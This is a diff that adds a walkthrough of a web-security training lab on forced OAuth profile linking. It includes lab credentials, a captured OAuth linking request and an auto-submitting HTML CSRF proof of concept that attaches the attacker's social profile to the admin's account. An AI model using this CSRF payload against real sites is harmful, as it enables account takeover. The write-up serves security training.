@@ -259,7 +259,84 @@ Te: trailers
 
 
 
+<details>
+     <summary>Lab: Forced OAuth profile linking</summary>
 
+> ## **`To solve the lab, use a CSRF attack to attach your own social media profile to the admin user's account on the blog website, then access the admin panel and delete carlos. `**
+>
+>  The admin user will open anything you send from the exploit server and they always have an active session on the blog website.
+
+> You can log in to your own accounts using the following credentials:
+
+-  Blog website account:`` wiener:peter``
+-  Social media profile:`` peter.wiener:hotdog``
+
+
+----
+
+1. login with ``wiener:peter``
+
+<img width="1273" height="537" alt="image" src="https://github.com/user-attachments/assets/ff27a0db-4598-4647-b7ba-a28c62d40fb9" />
+
+2. click **``Attach a social profile``**
+
+<img width="907" height="437" alt="image" src="https://github.com/user-attachments/assets/80696210-7ea5-4def-9f15-518fd442c4aa" />
+
+3. now click on **``Attach a social profile``** again and see the request 
+
+```http
+GET /oauth-linking?code=YY52NQhSrmG4yvxAM5UPtPhrwgBimnWuPsBRXnNmo0x HTTP/2
+Host: 0af400fc034fa721828c2e1b008a00fe.web-security-academy.net
+Cookie: session=zhztY0fc04nIrQw0u2jRWNHd4UdZ6hl7
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: https://0af400fc034fa721828c2e1b008a00fe.web-security-academy.net/
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: cross-site
+Sec-Fetch-User: ?1
+Priority: u=0, i
+Te: trailers
+```
+
+4. after that do **`CSRF poc`**
+
+
+```html
+<html>
+<body>
+  <form action="https://0af400fc034fa721828c2e1b008a00fe.web-security-academy.net/oauth-linking" method="GET">
+    <input type="hidden" name="code" value="YY52NQhSrmG4yvxAM5UPtPhrwgBimnWuPsBRXnNmo0x" />
+    <input type="submit" value="Submit request" />
+  </form>
+  <script>
+    document.forms[0].submit();
+  </script>
+</body>
+</html>
+```
+   
+5. store it and send it to victem 
+
+<img width="1248" height="399" alt="image" src="https://github.com/user-attachments/assets/9f87e559-8142-48b3-aed0-9c5bc5904b3d" />
+
+6. after that go back to ****`my-account`**** you will find that usernme disappeared
+
+
+<img width="1237" height="551" alt="image" src="https://github.com/user-attachments/assets/161ee210-ee49-43bd-b910-e2f726be7c61" />
+
+7. now logout and login again but with socialmedia profile **`peter.wiener:hotdog`**
+
+<img width="1460" height="464" alt="image" src="https://github.com/user-attachments/assets/fc767282-bf95-4610-b139-a0d0cada186b" />
+
+<img width="1422" height="450" alt="image" src="https://github.com/user-attachments/assets/b65ab03a-f146-42c5-b836-36b498f27959" />
+
+
+     
+</details>
 
 
 
